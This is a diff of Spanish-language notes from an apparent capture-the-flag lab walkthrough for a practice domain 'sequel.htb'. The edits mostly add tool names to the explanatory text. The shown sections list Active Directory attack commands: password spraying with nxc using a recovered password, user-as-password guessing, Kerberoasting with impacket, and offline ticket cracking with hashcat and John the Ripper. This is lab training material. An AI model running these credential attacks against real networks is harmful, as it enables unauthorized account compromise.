@@ -170,7 +170,7 @@ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
 
 ## Password spraying
 
-Con [[CRACKMAPEXEC]] hacemos password spraying para ver si una contraseña vale para otro osuario
+Con [[CRACKMAPEXEC]] hacemos password spraying para ver si una contraseña vale para otro usuario
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
 ```
@@ -178,6 +178,7 @@ nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su'
 
 ## User as Password
 
+Con [[CRACKMAPEXEC]] probaremos a usar una lista de contraseñas y usuarios para ver si alguno corresponde entre ellos
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
 ```
@@ -185,7 +186,7 @@ nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
 
 ## Kerberoasting
 
-Enumerar usuarios kerberoasteables
+Con [[IMPACKET]] enumeramos los usuarios que pueden ser kerberoasteables
 ```shell
 impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su'
 ```
@@ -199,17 +200,18 @@ sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,
 sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb        
 ```
 
-Solicitar los tickets de estsos usuarios
+Solicitar los tickets con [[IMPACKET]] de los usuarios existentes
 ```shell
 impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su' -request
 ```
 
 Nos lo guardamos en un fichero llamado `hash`
-Los crakeamos
+Los crakeamos con  [[HASCAT]]
 ```shell
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
+Y al no darnos resultados lo probamos también con [[JOHN THE RIPPER]]
 ```shell
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
